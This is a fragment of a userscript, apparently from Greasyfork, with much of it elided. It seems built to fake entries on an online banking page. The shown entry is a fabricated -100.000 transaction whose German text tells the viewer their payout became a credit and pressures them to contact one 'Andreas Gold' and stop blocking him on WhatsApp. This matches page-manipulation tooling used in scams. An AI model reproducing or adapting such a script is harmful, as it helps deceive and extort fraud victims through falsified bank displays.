// ==UserScript==
// @name         Ed Start 4Rec sp.meinestadt61@web.de
...
// @downloadURL https://update.greasyfork.org/scripts/534256/Ed%20Start%204Rec%20spmeinestadt61%40webde.user.js
// @updateURL https://update.greasyfork.org/scripts/534256/Ed%20Start%204Rec%20spmeinestadt61%40webde.meta.js
// ==/UserScript==
...
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    ...
    var accountsecurity = "4634 0443 96";
...
//        },
        {
            predecimalAmount: '-100.000',
            decimalAmount: ',00',
            transactionTitle: 'Inna Wentzke',
            transactionInfo: "  KREDIT. BITTE ANDREAS GOLD KONTAKTIEREN, UM DEN AUFZULÖSEN. SIE SOLLTEN IHN NICHT ZUM 4TEN MAL ÜBER WHATSAPP BLOCKIEREN. ANSTATT VON AUSZAHLUNG BEKOMMEN SIE JETZT KREDIT.",
            isNegative: false // Example flag, modify this based on your actual logic
        },
